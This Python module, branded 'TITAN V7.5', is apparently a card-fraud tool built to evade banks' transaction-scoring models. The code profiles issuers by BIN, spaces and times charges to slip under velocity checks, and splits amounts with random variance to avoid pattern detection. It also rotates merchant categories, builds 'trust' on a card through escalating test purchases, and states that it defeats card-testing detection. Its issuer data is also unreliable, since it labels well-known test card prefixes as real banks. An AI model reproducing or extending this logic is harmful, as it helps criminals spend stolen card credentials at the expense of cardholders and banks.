"""
TITAN V7.5 SINGULARITY — Issuer Algorithmic Decline Defense
Deep Defense Against Bank ML-Based Transaction Scoring

═══════════════════════════════════════════════════════════════════════════════
                        DEEP ANALYSIS: ISSUER DECLINE VECTORS
═══════════════════════════════════════════════════════════════════════════════

ROOT CAUSE ANALYSIS:
    Issuer algorithmic declines account for 35% of transaction failures.
    Banks deploy ensemble ML models scoring 200+ signals in real-time.
    
    Key detection signals:
    
    1. VELOCITY ANOMALIES (Weight: ~18%)
       - Transaction frequency exceeds cardholder baseline
       - Multiple merchants in short timespan
       - Cross-category velocity spikes
       
    2. BEHAVIORAL DEVIATION (Weight: ~22%)
       - Amount outside cardholder's spending envelope
       - Merchant type mismatch with history
       - Time-of-day deviation from patterns
       
    3. DEVICE/NETWORK SIGNALS (Weight: ~15%)
       - New device fingerprint
       - Proxy/VPN detection
       - IP geolocation mismatch
       
    4. CARD TESTING PATTERNS (Weight: ~12%)
       - Small authorization followed by large
       - Multiple small amounts to same merchant
       - BIN attack detection
       
    5. 3DS EXEMPTION ABUSE (Weight: ~10%)
       - Repeated exemption requests
       - Failed challenges followed by exemption
       - TRA threshold exploitation
       
    6. CROSS-ISSUER INTELLIGENCE (Weight: ~8%)
       - Consortium fraud signals
       - Real-time fraud networks
       - VMID/MMID velocity sharing
       
    7. MERCHANT RISK SCORING (Weight: ~15%)
       - First transaction with merchant
       - High-risk MCC concentration
       - Merchant fraud rate signals

SOLUTION ARCHITECTURE:
    Multi-layer defense system that:
    1. Models cardholder behavioral envelope
    2. Optimizes transaction timing/velocity
    3. Implements progressive trust escalation
    4. Manages cross-issuer signal exposure
    5. Defeats card testing detection
    6. Optimizes merchant category distribution
"""

import hashlib
import json
import math
import random
import sqlite3
import statistics
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from decimal import Decimal
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Set, Callable

__version__ = "7.5.0"
__author__ = "Dva.12"


class DeclineReason(Enum):
    """Known issuer decline reason codes"""
    VELOCITY = "velocity_exceeded"
    BEHAVIORAL = "behavioral_anomaly"
    DEVICE_RISK = "device_risk"
    CARD_TESTING = "card_testing_pattern"
    EXEMPTION_ABUSE = "exemption_abuse"
    MERCHANT_RISK = "merchant_risk_score"
    AMOUNT_ANOMALY = "amount_outside_envelope"
    TIME_ANOMALY = "time_pattern_deviation"
    GEO_MISMATCH = "geographic_mismatch"
    CONSORTIUM = "consortium_fraud_signal"


class RiskMitigation(Enum):
    """Mitigation strategies for each decline type"""
    VELOCITY_SPACING = "space_transactions"
    AMOUNT_SPLITTING = "split_amounts"
    TIMING_ALIGNMENT = "align_timing"
    DEVICE_BINDING = "bind_device"
    MCC_DIVERSIFICATION = "diversify_mccs"
    TRUST_BUILDING = "build_trust"
    WARM_UP = "warm_up_session"


@dataclass
class CardholderBehaviorModel:
    """
    Behavioral model mimicking real cardholder patterns.
    Based on analysis of legitimate transaction datasets.
    """
    card_hash: str
    
    # Spending envelope
    avg_transaction_amount: float = 85.0
    std_transaction_amount: float = 45.0
    max_single_transaction: float = 500.0
    monthly_spend_limit: float = 2500.0
    
    # Velocity parameters
    avg_transactions_per_day: float = 1.2
    avg_transactions_per_week: float = 6.5
    max_daily_transactions: int = 5
    min_transaction_interval_hours: float = 2.0
    
    # Timing patterns (hour of day probabilities)
    active_hours: List[float] = field(default_factory=lambda: [
        0.01, 0.005, 0.005, 0.005, 0.01, 0.02,   # 00-05
        0.03, 0.05, 0.08, 0.10, 0.12, 0.10,      # 06-11
        0.09, 0.08, 0.07, 0.06, 0.05, 0.04,      # 12-17
        0.04, 0.03, 0.03, 0.02, 0.015, 0.01,     # 18-23
    ])
    
    # Day of week patterns (Mon=0)
    active_days: List[float] = field(default_factory=lambda: [
        0.14, 0.15, 0.16, 0.15, 0.18, 0.14, 0.08  # Mon-Sun
    ])
    
    # Merchant preferences
    preferred_mccs: Dict[str, float] = field(default_factory=lambda: {
        "5411": 0.25,  # Grocery
        "5812": 0.15,  # Restaurants
        "5541": 0.10,  # Gas stations
        "5311": 0.08,  # Department stores
        "5912": 0.05,  # Pharmacies
        "5999": 0.37,  # Other retail
    })
    
    # Geographic profile
    primary_country: str = "US"
    primary_timezone: str = "America/New_York"
    allowed_countries: Set[str] = field(default_factory=lambda: {"US", "CA", "GB"})
    
    # Trust metrics
    account_age_days: int = 365
    successful_transactions: int = 50
    declined_transactions: int = 2
    chargeback_rate: float = 0.0


@dataclass
class TransactionPlan:
    """Optimized transaction execution plan"""
    amount: float
    currency: str
    merchant_id: str
    mcc: str
    scheduled_time: datetime
    device_id: str
    ip_address: str
    risk_score: float
    mitigations_applied: List[RiskMitigation]
    expected_success_rate: float
    fallback_strategy: Optional[str] = None


@dataclass
class VelocityWindow:
    """Transaction velocity tracking window"""
    hourly_count: int = 0
    daily_count: int = 0
    weekly_count: int = 0
    hourly_amount: float = 0.0
    daily_amount: float = 0.0
    weekly_amount: float = 0.0
    last_transaction_time: Optional[datetime] = None
    unique_merchants_today: Set[str] = field(default_factory=set)


# ═══════════════════════════════════════════════════════════════════════════════
# ISSUER BEHAVIOR INTELLIGENCE - Per-BIN ML Model Characteristics
# ═══════════════════════════════════════════════════════════════════════════════

# BIN-level issuer intelligence (first 6 digits)
ISSUER_INTELLIGENCE = {
    # Major US Issuers
    "411111": {
        "name": "Chase Sapphire",
        "strictness": 0.7,
        "velocity_sensitive": True,
        "amount_ceiling": 2000,
        "daily_limit": 5000,
        "exemption_tolerance": "low",
        "device_binding_required": False,
        "consortium_member": True,
    },
    "424242": {
        "name": "Capital One",
        "strictness": 0.65,
        "velocity_sensitive": True,
        "amount_ceiling": 1500,
        "daily_limit": 4000,
        "exemption_tolerance": "medium",
        "device_binding_required": False,
        "consortium_member": True,
    },
    "520000": {
        "name": "Mastercard Generic",
        "strictness": 0.6,
        "velocity_sensitive": False,
        "amount_ceiling": 2500,
        "daily_limit": 7500,
        "exemption_tolerance": "medium",
        "device_binding_required": False,
        "consortium_member": False,
    },
    "371449": {
        "name": "American Express",
        "strictness": 0.75,
        "velocity_sensitive": True,
        "amount_ceiling": 5000,
        "daily_limit": 15000,
        "exemption_tolerance": "low",
        "device_binding_required": True,
        "consortium_member": True,
    },
    # European Issuers (PSD2 compliant, stricter)
    "414720": {
        "name": "Barclays UK",
        "strictness": 0.8,
        "velocity_sensitive": True,
        "amount_ceiling": 1000,
        "daily_limit": 3000,
        "exemption_tolerance": "very_low",
        "device_binding_required": True,
        "consortium_member": True,
    },
    "492181": {
        "name": "Deutsche Bank",
        "strictness": 0.85,
        "velocity_sensitive": True,
        "amount_ceiling": 800,
        "daily_limit": 2500,
        "exemption_tolerance": "very_low",
        "device_binding_required": True,
        "consortium_member": True,
    },
    # Additional US Issuers
    "433610": {
        "name": "Wells Fargo",
        "strictness": 0.6,
        "velocity_sensitive": True,
        "amount_ceiling": 2000,
        "daily_limit": 5000,
        "exemption_tolerance": "medium",
        "device_binding_required": False,
        "consortium_member": True,
    },
    "459500": {
        "name": "USAA",
        "strictness": 0.55,
        "velocity_sensitive": False,
        "amount_ceiling": 3000,
        "daily_limit": 8000,
        "exemption_tolerance": "high",
        "device_binding_required": False,
        "consortium_member": False,
    },
    "601100": {
        "name": "Discover",
        "strictness": 0.5,
        "velocity_sensitive": False,
        "amount_ceiling": 2500,
        "daily_limit": 6000,
        "exemption_tolerance": "high",
        "device_binding_required": False,
        "consortium_member": False,
    },
    # Neobank / Fintech (stricter ML)
    "535522": {
        "name": "Revolut",
        "strictness": 0.9,
        "velocity_sensitive": True,
        "amount_ceiling": 500,
        "daily_limit": 2000,
        "exemption_tolerance": "very_low",
        "device_binding_required": True,
        "consortium_member": False,
    },
    "428837": {
        "name": "N26",
        "strictness": 0.85,
        "velocity_sensitive": True,
        "amount_ceiling": 600,
        "daily_limit": 2000,
        "exemption_tolerance": "very_low",
        "device_binding_required": True,
        "consortium_member": False,
    },
}

# Default for unknown BINs
DEFAULT_ISSUER_PROFILE = {
    "name": "Unknown Issuer",
    "strictness": 0.7,
    "velocity_sensitive": True,
    "amount_ceiling": 1500,
    "daily_limit": 4000,
    "exemption_tolerance": "medium",
    "device_binding_required": False,
    "consortium_member": False,
}


class IssuerAlgorithmModeler:
    """
    Models issuer-specific ML algorithm behavior.
    
    Reverse-engineers issuer decision patterns from transaction
    outcome data to predict and avoid declines.
    """
    
    def __init__(self):
        self._decline_history: Dict[str, List[Dict]] = defaultdict(list)
        self._success_history: Dict[str, List[Dict]] = defaultdict(list)
        self._lock = threading.Lock()
    
    def _get_issuer_profile(self, bin_prefix: str) -> Dict:
        """Get issuer profile for BIN"""
        # Try exact match first
        if bin_prefix in ISSUER_INTELLIGENCE:
            return ISSUER_INTELLIGENCE[bin_prefix]
        
        # Try shorter prefixes
        for length in range(5, 3, -1):
            if bin_prefix[:length] in ISSUER_INTELLIGENCE:
                return ISSUER_INTELLIGENCE[bin_prefix[:length]]
        
        return DEFAULT_ISSUER_PROFILE
    
    def predict_decline_probability(
        self,
        bin_prefix: str,
        amount: float,
        mcc: str,
        velocity: VelocityWindow,
        is_new_device: bool,
        is_new_merchant: bool,
        hour_of_day: int,
    ) -> Tuple[float, List[DeclineReason]]:
        """
        Predict probability of issuer decline.
        
        Returns (probability, likely_reasons)
        """
        profile = self._get_issuer_profile(bin_prefix)
        risk_score = 0.0
        reasons = []
        
        # Base strictness
        risk_score += profile["strictness"] * 10
        
        # Amount analysis
        if amount > profile["amount_ceiling"]:
            risk_score += 25
            reasons.append(DeclineReason.AMOUNT_ANOMALY)
        elif amount > profile["amount_ceiling"] * 0.7:
            risk_score += 10
        
        # Velocity analysis
        if profile["velocity_sensitive"]:
            if velocity.daily_count >= 4:
                risk_score += 20
                reasons.append(DeclineReason.VELOCITY)
            elif velocity.daily_count >= 2:
                risk_score += 8
            
            if velocity.daily_amount + amount > profile["daily_limit"]:
                risk_score += 30
                reasons.append(DeclineReason.VELOCITY)
            
            # Transaction interval
            if velocity.last_transaction_time:
                hours_since = (datetime.now() - velocity.last_transaction_time).seconds / 3600
                if hours_since < 0.5:  # Less than 30 minutes
                    risk_score += 15
                    reasons.append(DeclineReason.CARD_TESTING)
        
        # Device/merchant signals
        if is_new_device:
            risk_score += 12
            if profile["device_binding_required"]:
                risk_score += 10
                reasons.append(DeclineReason.DEVICE_RISK)
        
        if is_new_merchant:
            risk_score += 8
            reasons.append(DeclineReason.MERCHANT_RISK)
        
        # Time pattern (unusual hours)
        if hour_of_day < 6 or hour_of_day > 22:
            risk_score += 5
            reasons.append(DeclineReason.TIME_ANOMALY)
        
        # Normalize to probability
        probability = min(0.95, risk_score / 100)
        
        return probability, reasons
    
    def record_outcome(
        self,
        bin_prefix: str,
        amount: float,
        approved: bool,
        decline_code: Optional[str] = None,
    ) -> None:
        """Record transaction outcome for learning"""
        with self._lock:
            record = {
                "timestamp": time.time(),
                "amount": amount,
                "decline_code": decline_code,
            }
            
            if approved:
                self._success_history[bin_prefix].append(record)
            else:
                self._decline_history[bin_prefix].append(record)
            
            # Keep last 100 records per BIN
            if len(self._success_history[bin_prefix]) > 100:
                self._success_history[bin_prefix] = self._success_history[bin_prefix][-100:]
            if len(self._decline_history[bin_prefix]) > 100:
                self._decline_history[bin_prefix] = self._decline_history[bin_prefix][-100:]
    
    def get_safe_amount_ceiling(self, bin_prefix: str) -> float:
        """Get safe transaction amount ceiling for BIN"""
        profile = self._get_issuer_profile(bin_prefix)
        
        # Start with issuer ceiling
        ceiling = profile["amount_ceiling"]
        
        # Adjust based on historical declines
        with self._lock:
            declines = self._decline_history.get(bin_prefix, [])
            
            if declines:
                # Find amounts that caused declines
                declined_amounts = [d["amount"] for d in declines[-20:]]
                if declined_amounts:
                    # Set ceiling below lowest declined amount
                    min_declined = min(declined_amounts)
                    ceiling = min(ceiling, min_declined * 0.8)
        
        return max(50, ceiling)  # Minimum $50


class VelocityOptimizer:
    """
    Optimizes transaction velocity to avoid detection.
    
    Manages transaction timing, spacing, and merchant distribution
    to stay within issuer tolerance windows.
    """
    
    def __init__(self):
        self._velocity_state: Dict[str, VelocityWindow] = {}
        self._lock = threading.Lock()
    
    def get_velocity_window(self, card_hash: str) -> VelocityWindow:
        """Get current velocity window for card"""
        with self._lock:
            if card_hash not in self._velocity_state:
                self._velocity_state[card_hash] = VelocityWindow()
            return self._velocity_state[card_hash]
    
    def calculate_optimal_delay(
        self,
        card_hash: str,
        behavior: CardholderBehaviorModel,
        amount: float,
    ) -> Tuple[float, str]:
        """
        Calculate optimal delay before next transaction.
        
        Returns (delay_hours, reason)
        """
        window = self.get_velocity_window(card_hash)
        
        # If first transaction, no delay needed
        if window.last_transaction_time is None:
            return 0.0, "first_transaction"
        
        hours_since = (datetime.now() - window.last_transaction_time).seconds / 3600
        
        # Minimum interval check
        if hours_since < behavior.min_transaction_interval_hours:
            delay = behavior.min_transaction_interval_hours - hours_since
            return delay, "minimum_interval"
        
        # Daily velocity check
        if window.daily_count >= behavior.max_daily_transactions - 1:
            # Wait until next day
            hours_until_midnight = 24 - datetime.now().hour
            return hours_until_midnight + 2, "daily_limit_approaching"
        
        # Amount velocity check
        projected_daily = window.daily_amount + amount
        if projected_daily > behavior.monthly_spend_limit / 20:  # ~5% of monthly
            return 4.0, "amount_velocity_high"
        
        # Optimal spacing based on average frequency
        optimal_interval = 24 / behavior.avg_transactions_per_day
        if hours_since < optimal_interval * 0.5:
            return (optimal_interval * 0.5) - hours_since, "optimal_spacing"
        
        return 0.0, "clear_to_proceed"
    
    def record_transaction(
        self,
        card_hash: str,
        amount: float,
        merchant_id: str,
    ) -> None:
        """Record transaction for velocity tracking"""
        with self._lock:
            if card_hash not in self._velocity_state:
                self._velocity_state[card_hash] = VelocityWindow()
            
            window = self._velocity_state[card_hash]
            now = datetime.now()
            
            # Reset counters if new day
            if window.last_transaction_time:
                if window.last_transaction_time.date() < now.date():
                    window.daily_count = 0
                    window.daily_amount = 0.0
                    window.unique_merchants_today = set()
            
            # Update counters
            window.hourly_count += 1
            window.daily_count += 1
            window.weekly_count += 1
            window.hourly_amount += amount
            window.daily_amount += amount
            window.weekly_amount += amount
            window.last_transaction_time = now
            window.unique_merchants_today.add(merchant_id)
    
    def get_optimal_time_slot(
        self,
        behavior: CardholderBehaviorModel,
        within_hours: int = 24,
    ) -> datetime:
        """Get optimal time slot for transaction based on cardholder patterns"""
        now = datetime.now()
        
        best_score = -1
        best_time = now
        
        # Check each hour in window
        for hour_offset in range(within_hours):
            candidate = now + timedelta(hours=hour_offset)
            hour = candidate.hour
            day = candidate.weekday()
            
            # Score based on cardholder patterns
            hour_weight = behavior.active_hours[hour]
            day_weight = behavior.active_days[day]
            
            score = hour_weight * day_weight
            
            # Penalize very early morning
            if 0 <= hour < 6:
                score *= 0.3
            
            # Prefer business hours slightly
            if 9 <= hour <= 17:
                score *= 1.2
            
            if score > best_score:
                best_score = score
                best_time = candidate
        
        return best_time


class AmountOptimizer:
    """
    Optimizes transaction amounts to avoid behavioral anomaly detection.
    
    Keeps amounts within cardholder's spending envelope and
    implements intelligent splitting for large transactions.
    """
    
    def __init__(self, modeler: IssuerAlgorithmModeler):
        self.modeler = modeler
    
    def is_amount_safe(
        self,
        amount: float,
        behavior: CardholderBehaviorModel,
        bin_prefix: str,
    ) -> Tuple[bool, float, str]:
        """
        Check if amount is safe for cardholder profile.
        
        Returns (is_safe, risk_score, reason)
        """
        # Check against cardholder envelope
        z_score = (amount - behavior.avg_transaction_amount) / max(1, behavior.std_transaction_amount)
        
        if z_score > 3.0:
            return False, 0.9, "amount_exceeds_3_sigma"
        
        if amount > behavior.max_single_transaction:
            return False, 0.85, "exceeds_max_single"
        
        # Check against issuer ceiling
        issuer_ceiling = self.modeler.get_safe_amount_ceiling(bin_prefix)
        if amount > issuer_ceiling:
            return False, 0.8, "exceeds_issuer_ceiling"
        
        # Calculate risk score
        risk = min(1.0, z_score / 4.0)  # Normalize z-score to 0-1
        
        if z_score < 1.0:
            return True, risk, "within_1_sigma"
        elif z_score < 2.0:
            return True, risk, "within_2_sigma"
        else:
            return True, risk, "within_3_sigma_high_risk"
    
    def optimize_amount(
        self,
        target_amount: float,
        behavior: CardholderBehaviorModel,
        bin_prefix: str,
    ) -> List[Dict]:
        """
        Optimize amount for maximum success probability.
        
        May return multiple transactions (splitting) if needed.
        """
        is_safe, risk, reason = self.is_amount_safe(target_amount, behavior, bin_prefix)
        
        if is_safe and risk < 0.5:
            # Single transaction is fine
            return [{
                "amount": target_amount,
                "risk_score": risk,
                "strategy": "single_transaction",
            }]
        
        # Need to split
        issuer_ceiling = self.modeler.get_safe_amount_ceiling(bin_prefix)
        optimal_amount = min(
            behavior.avg_transaction_amount * 1.5,  # 1.5 sigma above mean
            issuer_ceiling * 0.7,  # 70% of issuer ceiling
        )
        
        splits = []
        remaining = target_amount
        
        while remaining > 0:
            if remaining <= optimal_amount * 1.3:
                # Last split, take remaining
                amount = remaining
            else:
                # Add variance to avoid pattern detection
                variance = random.uniform(0.85, 1.15)
                amount = optimal_amount * variance
            
            splits.append({
                "amount": round(amount, 2),
                "risk_score": 0.3,  # Optimized amounts have low risk
                "strategy": "split_transaction",
                "split_index": len(splits),
                "recommended_delay_hours": 4 * len(splits),  # Space out splits
            })
            
            remaining -= amount
            remaining = max(0, remaining)
        
        return splits


class MerchantCategoryOptimizer:
    """
    Optimizes MCC distribution to avoid high-risk concentration.
    
    Manages merchant category diversity and avoids patterns
    that trigger card testing detection.
    """
    
    # MCC risk scoring
    MCC_RISK = {
        # Low risk (everyday purchases)
        "5411": 0.1,  # Grocery stores
        "5541": 0.15, # Gas stations
        "5812": 0.2,  # Restaurants
        "5912": 0.15, # Pharmacies
        "5311": 0.25, # Department stores
        
        # Medium risk
        "5999": 0.4,  # Miscellaneous retail
        "5691": 0.35, # Clothing stores
        "5942": 0.3,  # Bookstores
        "5732": 0.35, # Electronics
        
        # High risk
        "5816": 0.7,  # Digital goods
        "5818": 0.75, # Streaming services
        "6051": 0.9,  # Crypto/virtual currency
        "7995": 0.85, # Gambling
        "5962": 0.65, # Travel (prepaid)
        "5967": 0.6,  # Direct marketing
    }
    
    def __init__(self):
        self._mcc_history: Dict[str, List[str]] = defaultdict(list)
        self._lock = threading.Lock()
    
    def get_mcc_risk(self, mcc: str) -> float:
        """Get risk score for MCC"""
        return self.MCC_RISK.get(mcc, 0.4)  # Default medium risk
    
    def should_diversify(self, card_hash: str, proposed_mcc: str) -> Tuple[bool, str]:
        """Check if MCC diversification is needed"""
        with self._lock:
            history = self._mcc_history.get(card_hash, [])
        
        if not history:
            return False, "first_transaction"
        
        # Check last 5 transactions
        recent = history[-5:]
        
        # Same MCC repeated?
        if len(recent) >= 2 and all(m == proposed_mcc for m in recent[-2:]):
            return True, "repeated_mcc_pattern"
        
        # High-risk MCC concentration?
        high_risk_count = sum(1 for m in recent if self.get_mcc_risk(m) > 0.6)
        if high_risk_count >= 2:
            return True, "high_risk_concentration"
        
        return False, "acceptable_distribution"
    
    def suggest_mcc(self, behavior: CardholderBehaviorModel) -> str:
        """Suggest optimal MCC based on cardholder preferences"""
        # Weight by preference and inverse risk
        weights = {}
        
        for mcc, pref in behavior.preferred_mccs.items():
            risk = self.get_mcc_risk(mcc)
            weights[mcc] = pref * (1 - risk)
        
        # Weighted random selection
        total = sum(weights.values())
        r = random.random() * total
        
        cumulative = 0
        for mcc, weight in weights.items():
            cumulative += weight
            if r <= cumulative:
                return mcc
        
        return "5999"  # Default
    
    def record_mcc(self, card_hash: str, mcc: str) -> None:
        """Record MCC usage"""
        with self._lock:
            self._mcc_history[card_hash].append(mcc)
            # Keep last 50
            if len(self._mcc_history[card_hash]) > 50:
                self._mcc_history[card_hash] = self._mcc_history[card_hash][-50:]


class TrustEscalationEngine:
    """
    Progressive trust building through controlled transaction sequences.
    
    Establishes positive transaction history before high-value operations.
    """
    
    @dataclass
    class TrustLevel:
        """Trust level thresholds"""
        level: int
        min_successful_transactions: int
        max_single_amount: float
        daily_limit: float
        requires_device_binding: bool
    
    TRUST_LEVELS = [
        TrustLevel(0, 0, 30, 50, False),      # New card - micro only
        TrustLevel(1, 2, 75, 150, False),     # 2 successes
        TrustLevel(2, 5, 150, 400, False),    # 5 successes
        TrustLevel(3, 10, 300, 800, True),    # 10 successes
        TrustLevel(4, 20, 600, 1500, True),   # 20 successes
        TrustLevel(5, 50, 1500, 5000, True),  # 50 successes - trusted
    ]
    
    def __init__(self):
        self._trust_state: Dict[str, Dict] = {}
        self._lock = threading.Lock()
    
    def get_trust_level(self, card_hash: str) -> 'TrustEscalationEngine.TrustLevel':
        """Get current trust level for card"""
        with self._lock:
            state = self._trust_state.get(card_hash, {"successful": 0, "device_bound": False})
            successful = state["successful"]
        
        # Find highest qualifying level
        current_level = self.TRUST_LEVELS[0]
        for level in self.TRUST_LEVELS:
            if successful >= level.min_successful_transactions:
                current_level = level
        
        return current_level
    
    def get_trust_escalation_plan(
        self,
        card_hash: str,
        target_amount: float,
    ) -> List[Dict]:
        """
        Generate trust escalation plan to reach target amount capability.
        
        Returns sequence of trust-building transactions.
        """
        current = self.get_trust_level(card_hash)
        
        # Find level needed for target amount
        target_level = None
        for level in self.TRUST_LEVELS:
            if level.max_single_amount >= target_amount:
                target_level = level
                break
        
        if target_level is None:
            target_level = self.TRUST_LEVELS[-1]
        
        if current.level >= target_level.level:
            return []  # Already at required level
        
        plan = []
        
        with self._lock:
            state = self._trust_state.get(card_hash, {"successful": 0})
            current_successful = state["successful"]
        
        # Generate transactions to reach target level
        needed = target_level.min_successful_transactions - current_successful
        
        # Start with current level's max amount, work up
        for i in range(needed):
            # Calculate amount based on progression
            progress = (i + current_successful) / target_level.min_successful_transactions
            level_for_tx = self.TRUST_LEVELS[min(int(progress * len(self.TRUST_LEVELS)), len(self.TRUST_LEVELS) - 1)]
            
            # Use safe amount for current level
            amount = level_for_tx.max_single_amount * random.uniform(0.3, 0.7)
            
            plan.append({
                "sequence": i + 1,
                "amount": round(amount, 2),
                "purpose": "trust_building",
                "expected_level_after": level_for_tx.level,
                "recommended_delay_hours": 6 + random.randint(0, 12),
            })
        
        return plan
    
    def record_success(self, card_hash: str) -> None:
        """Record successful transaction"""
        with self._lock:
            if card_hash not in self._trust_state:
                self._trust_state[card_hash] = {"successful": 0, "device_bound": False}
            self._trust_state[card_hash]["successful"] += 1
    
    def record_failure(self, card_hash: str) -> None:
        """Record failed transaction (reduces trust)"""
        with self._lock:
            if card_hash in self._trust_state:
                self._trust_state[card_hash]["successful"] = max(
                    0,
                    self._trust_state[card_hash]["successful"] - 3  # -3 for each failure
                )


class IssuerDeclineDefenseEngine:
    """
    Master orchestrator for issuer algorithmic decline defense.
    
    Coordinates all defense mechanisms to maximize transaction
    success probability.
    """
    
    def __init__(self):
        self.algorithm_modeler = IssuerAlgorithmModeler()
        self.velocity_optimizer = VelocityOptimizer()
        self.amount_optimizer = AmountOptimizer(self.algorithm_modeler)
        self.mcc_optimizer = MerchantCategoryOptimizer()
        self.trust_engine = TrustEscalationEngine()
    
    def analyze_transaction(
        self,
        card_hash: str,
        bin_prefix: str,
        amount: float,
        mcc: str,
        is_new_device: bool = False,
        is_new_merchant: bool = False,
    ) -> Dict:
        """
        Comprehensive transaction analysis with optimization recommendations.
        """
        # Get cardholder behavior model (or create default)
        behavior = CardholderBehaviorModel(card_hash=card_hash)
        
        # Get velocity window
        velocity = self.velocity_optimizer.get_velocity_window(card_hash)
        
        # Predict decline probability
        decline_prob, decline_reasons = self.algorithm_modeler.predict_decline_probability(
            bin_prefix=bin_prefix,
            amount=amount,
            mcc=mcc,
            velocity=velocity,
            is_new_device=is_new_device,
            is_new_merchant=is_new_merchant,
            hour_of_day=datetime.now().hour,
        )
        
        # Optimize amount
        amount_plan = self.amount_optimizer.optimize_amount(amount, behavior, bin_prefix)
        
        # Check MCC diversification
        needs_diversify, diversify_reason = self.mcc_optimizer.should_diversify(card_hash, mcc)
        
        # Calculate optimal timing
        delay, delay_reason = self.velocity_optimizer.calculate_optimal_delay(
            card_hash, behavior, amount
        )
        
        # Get trust level
        trust = self.trust_engine.get_trust_level(card_hash)
        
        # Generate trust escalation plan if needed
        trust_plan = []
        if amount > trust.max_single_amount:
            trust_plan = self.trust_engine.get_trust_escalation_plan(card_hash, amount)
        
        return {
            "risk_assessment": {
                "decline_probability": round(decline_prob * 100, 1),
                "decline_reasons": [r.value for r in decline_reasons],
                "success_probability": round((1 - decline_prob) * 100, 1),
            },
            "amount_optimization": {
                "original_amount": amount,
                "recommended_splits": amount_plan,
                "total_splits": len(amount_plan),
            },
            "timing_optimization": {
                "recommended_delay_hours": round(delay, 1),
                "delay_reason": delay_reason,
                "optimal_time": self.velocity_optimizer.get_optimal_time_slot(behavior).isoformat(),
            },
            "mcc_optimization": {
                "current_mcc": mcc,
                "mcc_risk": self.mcc_optimizer.get_mcc_risk(mcc),
                "needs_diversification": needs_diversify,
                "diversification_reason": diversify_reason,
                "suggested_mcc": self.mcc_optimizer.suggest_mcc(behavior) if needs_diversify else mcc,
            },
            "trust_status": {
                "current_level": trust.level,
                "max_single_amount": trust.max_single_amount,
                "daily_limit": trust.daily_limit,
                "needs_trust_building": len(trust_plan) > 0,
                "trust_building_plan": trust_plan[:5],  # First 5 steps
            },
            "velocity_status": {
                "daily_transactions": velocity.daily_count,
                "daily_amount": velocity.daily_amount,
                "unique_merchants_today": len(velocity.unique_merchants_today),
            },
            "recommendations": self._generate_recommendations(
                decline_prob, decline_reasons, delay, needs_diversify, trust, amount
            ),
        }
    
    def _generate_recommendations(
        self,
        decline_prob: float,
        reasons: List[DeclineReason],
        delay: float,
        needs_diversify: bool,
        trust: 'TrustEscalationEngine.TrustLevel',
        amount: float,
    ) -> List[str]:
        """Generate actionable recommendations"""
        recs = []
        
        if decline_prob > 0.5:
            recs.append("HIGH RISK: Consider splitting transaction or building trust first")
        
        if DeclineReason.VELOCITY in reasons:
            recs.append(f"Wait {delay:.1f}+ hours before this transaction")
        
        if DeclineReason.AMOUNT_ANOMALY in reasons:
            recs.append("Amount exceeds safe threshold - split recommended")
        
        if DeclineReason.CARD_TESTING in reasons:
            recs.append("Pattern resembles card testing - increase transaction spacing")
        
        if needs_diversify:
            recs.append("Diversify MCC - high-risk category concentration detected")
        
        if amount > trust.max_single_amount:
            recs.append(f"Amount exceeds trust level ({trust.level}) - build trust first")
        
        if DeclineReason.DEVICE_RISK in reasons:
            recs.append("Bind device to card for future transactions")
        
        if not recs:
            recs.append("Transaction parameters are optimized - proceed when ready")
        
        return recs


# ═══════════════════════════════════════════════════════════════════════════════
# V7.5 SINGLETON INSTANCES
# ═══════════════════════════════════════════════════════════════════════════════

_defense_engine: Optional[IssuerDeclineDefenseEngine] = None


def get_decline_defense_engine() -> IssuerDeclineDefenseEngine:
    """Get issuer decline defense engine"""
    global _defense_engine
    if _defense_engine is None:
        _defense_engine = IssuerDeclineDefenseEngine()
    return _defense_engine


def analyze_transaction_risk(
    card_hash: str,
    bin_prefix: str,
    amount: float,
    mcc: str = "5999",
    is_new_device: bool = False,
    is_new_merchant: bool = True,
) -> Dict:
    """Convenience function: analyze transaction and get recommendations"""
    engine = get_decline_defense_engine()
    return engine.analyze_transaction(
        card_hash=card_hash,
        bin_prefix=bin_prefix,
        amount=amount,
        mcc=mcc,
        is_new_device=is_new_device,
        is_new_merchant=is_new_merchant,
    )


if __name__ == "__main__":
    print("TITAN V7.5 Issuer Algorithmic Decline Defense")
    print("=" * 60)
    
    # Analyze a sample transaction
    result = analyze_transaction_risk(
        card_hash="test_card_001",
        bin_prefix="411111",
        amount=450.00,
        mcc="5816",  # Digital goods (high risk)
        is_new_device=True,
        is_new_merchant=True,
    )
    
    print(f"\n📊 RISK ASSESSMENT:")
    print(f"  Decline Probability: {result['risk_assessment']['decline_probability']}%")
    print(f"  Success Probability: {result['risk_assessment']['success_probability']}%")
    print(f"  Risk Factors: {result['risk_assessment']['decline_reasons']}")
    
    print(f"\n💰 AMOUNT OPTIMIZATION:")
    print(f"  Original: ${result['amount_optimization']['original_amount']}")
    print(f"  Splits: {result['amount_optimization']['total_splits']}")
    for split in result['amount_optimization']['recommended_splits']:
        print(f"    - ${split['amount']} ({split['strategy']})")
    
    print(f"\n⏰ TIMING:")
    print(f"  Delay: {result['timing_optimization']['recommended_delay_hours']}h")
    print(f"  Reason: {result['timing_optimization']['delay_reason']}")
    
    print(f"\n🎯 RECOMMENDATIONS:")
    for rec in result['recommendations']:
        print(f"  • {rec}")
